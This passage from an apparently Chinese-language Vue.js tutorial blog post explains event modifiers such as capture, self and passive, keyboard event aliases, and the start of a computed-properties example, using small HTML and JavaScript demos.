class="line">		&lt;div class=&quot;box1&quot; @click=&quot;showInfo(1)&quot;&gt;div1</span><br><span class="line">			&lt;div class=&quot;box2&quot; @click=&quot;showInfo(2)&quot;&gt;div2&lt;/div&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">		&lt;script&gt;</span><br><span class="line">			Vue.config.productionTip = false</span><br><span class="line"></span><br><span class="line">			const vm = new Vue(&#123;</span><br><span class="line">				el: &#x27;#app&#x27;,</span><br><span class="line">				data: &#123;</span><br><span class="line">					name: &#x27;sai&#x27;,</span><br><span class="line">				&#125;,</span><br><span class="line">				methods: &#123;</span><br><span class="line">					showInfo(value)&#123;</span><br><span class="line">						console.log(value)</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&lt;/script&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>点击<code>div2</code>时，按照冒泡机制，先输出的是<code>2</code>：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220512184859659.png" alt="image-20220512184859659"></p>
<p>我现在希望，按照捕获机制处理事件的回调：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span> @<span class="attr">click.capture</span>=<span class="string">&quot;showInfo(1)&quot;</span>&gt;</span>div1</span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo(2)&quot;</span>&gt;</span>div2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击<code>div2</code>，打印如下：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220512185002526.png" alt="image-20220512185002526"></p>
<h3 id="1-9-5-self"><a href="#1-9-5-self" class="headerlink" title="1.9.5.self"></a>1.9.5.<code>self</code></h3><p>只有<code>event.target</code>是当前操作的元素时才触发事件</p>
<p>我们先打印下冒泡时的<code>e.target</code>，操作点击的是<code>button</code>，打印的就是<code>button</code>元素</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">			<span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">background-color</span>: <span class="number">#b3d4fc</span>;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">showInfo</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">target</span>)</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于事件冒泡，会打印两次</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220512185908499.png" alt="image-20220512185908499"></p>
<p>现在给外层元素加上<code>.self</code>事件修饰符</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span> @<span class="attr">click.self</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击<code>button</code>的打印结果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220512190141765.png" alt="image-20220512190141765"></p>
<p>由于<code>event.target</code>是<code>button</code>，所以绑定在<code>div</code>的事件不会被执行</p>
<h3 id="1-9-6-passive"><a href="#1-9-6-passive" class="headerlink" title="1.9.6.passive	"></a>1.9.6.<code>passive	</code></h3><p>事件的默认行为立即执行，无需等待事件回调执行完毕</p>
<p>先给<code>ul</code>绑定<code>scroll</code>滚动条滚动事件，经观察，滚轮每使滚动条滚动一下，回调函数会调用<code>9</code>次，经验证是滚动条走了9个像素（不同的浏览器走的像素值不一样，<code>edge</code>走了9像素，<code>chrome</code>走了12个像素）</p>
<p><code>ul</code>获得焦点后，<code>scroll</code>事件可以使用小键盘的上下键来控制</p>
<p><code>scroll</code>事件滚动条一旦到了末端，再按滚轮时，对应的事件回调不再触发</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">			<span class="selector-class">.list</span> &#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">background-color</span>: <span class="number">#b3d4fc</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">overflow</span>: auto;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">			<span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span> @<span class="attr">scroll</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">showInfo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;scroll&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220512212041826.png" alt="image-20220512212041826"></p>
<p>和滚动条类似，还可以给鼠标滚轮，绑定滚动事件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span> @<span class="attr">wheel</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>鼠标滚轮每滚动一次，调用一次回调，当滚动条到达末端，再按滚轮时，事件回调仍会触发</p>
<p>引出<code>passive</code>：如果滚动事件的回调是执行了很复杂（耗时）的运算，那么页面滚动时，可能要等到计算完之后才会滚动（执行默认行为）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showInfo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以添加<code>passive</code>修饰符，优先执行默认行为，再执行事件回调，这样可以保证页面不卡顿</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span> @<span class="attr">wheel.passive</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是要注意，不是所有的事件都会存在<code>回调函数先调用，后执行默认行为</code>的问题，上面的案例中<code>scroll</code>事件就不会卡顿</p>
<h3 id="1-9-7-小结：事件修饰符"><a href="#1-9-7-小结：事件修饰符" class="headerlink" title="1.9.7.小结：事件修饰符"></a>1.9.7.小结：事件修饰符</h3><ul>
<li><code>prevent</code>：阻止绑定事件的标签上的默认事件<ul>
<li>阻止元素的默认回调</li>
</ul>
</li>
<li><code>stop</code>：阻止事件冒泡<ul>
<li>只希望内层元素的回调被执行</li>
</ul>
</li>
<li><code>once</code>：事件只触发一次<ul>
<li>回调函数只执行一次</li>
</ul>
</li>
<li><code>capture</code>：使用事件的捕获模式<ul>
<li>希望外层元素的回调优先执行</li>
</ul>
</li>
<li><code>self</code>：只有<code>event.target</code>是当前操作的元素时才触发事件<ul>
<li>只发生在自身时执行回调（忽略捕获&#x2F;冒泡）</li>
</ul>
</li>
<li><code>passive</code>：事件的默认行为立即执行，无需等待事件回调执行完毕<ul>
<li>优先执行元素的默认回调</li>
</ul>
</li>
<li>修饰符可以连续写<ul>
<li><code>@click.stop.prevent = &quot;showInfo&quot;</code></li>
</ul>
</li>
</ul>
<h2 id="1-10-键盘事件"><a href="#1-10-键盘事件" class="headerlink" title="1.10.键盘事件"></a>1.10.键盘事件</h2><p>使用：</p>
<ul>
<li><p>使用<code>vue</code>提供的别名：<code>@keyup.enter = &quot;showInfo&quot;</code></p>
<ul>
<li>额外注意<code>tab</code>：按下时就会切换焦点，不适合用<code>keyup</code>，得用<code>keydown</code></li>
</ul>
</li>
<li><p>使用<code>js</code>原生提供的名称：<code>@keyup.Shift = &quot;shoInfo&quot;</code></p>
<ul>
<li>如果按键的<code>key</code>是单词组成，绑定事件时，需要都转为小写，并且用<code>-</code>分隔：<code>@keyup.caps-lock = &quot;showInfo&quot;</code></li>
<li>有些按键是不可以绑定事件的</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">showInfo</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">key</span>, e.<span class="property">keyCode</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220513141036737.png" alt="image-20220513141036737"></p>
</li>
<li><p>系统修饰键（用法特殊）：<code>ctrl</code>、<code>alt</code>、<code>shift</code>、<code>meta</code></p>
<ul>
<li>配合<code>keyup</code>使用：按下<code>修饰键</code>的同时，再按下其他键，事件才被触发</li>
<li>配合<code>keydown</code>使用：正常触发事件</li>
</ul>
</li>
<li><p>也可以使用<code>keyCode</code>去指定具体的按键（不推荐）</p>
<ul>
<li><code>MDN</code>上已经移除该特性了</li>
<li>不同键盘上的<code>keyCode</code>对应的实际按键可能不一样</li>
</ul>
</li>
</ul>
<h3 id="小结：键盘事件"><a href="#小结：键盘事件" class="headerlink" title="小结：键盘事件"></a>小结：键盘事件</h3><ul>
<li><p><code>Vue</code>中常用的按键别名：</p>
<ul>
<li>回车：<code>enter</code></li>
<li>删除：<code>delete</code>，捕获<code>删除</code>和<code>退格键</code></li>
<li>退出：<code>esc</code></li>
<li>空格：<code>space</code></li>
<li>换行：<code>tab</code>，搭配<code>keydown</code></li>
<li>上：<code>up</code></li>
<li>下：<code>down</code></li>
<li>左：<code>left</code></li>
<li>右：<code>right</code></li>
</ul>
</li>
<li><p><code>Vue</code>未提供别名的按键，可以通过按键原始<code>key</code>值去绑定，但注意要转为<code>kebab-case</code>（短横线命名）</p>
</li>
<li><p>系统修饰键（用法特殊）：<code>ctrl</code>、<code>alt</code>、<code>shift</code>、<code>meta</code></p>
<ul>
<li><p>配合<code>keyup</code>使用：按下<code>修饰键</code>的同时，再按下其他键，事件才被触发，</p>
<ul>
<li>系统修饰符后面，可以再指定<code>其他键</code>：<code>@keyup.ctrl.y = &quot;showInfo&quot;</code></li>
</ul>
</li>
<li><p>配合<code>keydown</code>使用：正常触发事件</p>
</li>
</ul>
</li>
<li><p>也可以使用<code>keyCode</code>去指定具体的按键（不推荐）</p>
</li>
<li><p><code>Vue.config.keyCode.自定义键名 = 键码</code>，可以去定制按键别名</p>
</li>
</ul>
<h2 id="1-11-计算属性与监视属性"><a href="#1-11-计算属性与监视属性" class="headerlink" title="1.11.计算属性与监视属性"></a>1.11.计算属性与监视属性</h2><h3 id="1-11-1-计算属性"><a href="#1-11-1-计算属性" class="headerlink" title="1.11.1.计算属性"></a>1.11.1.计算属性</h3><h4 id="1-11-1-1-小案例"><a href="#1-11-1-1-小案例" class="headerlink" title="1.11.1.1.小案例"></a>1.11.1.1.小案例</h4><ul>
<li><p>需求一：拼接姓名</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span><span class="tag">&lt;<span 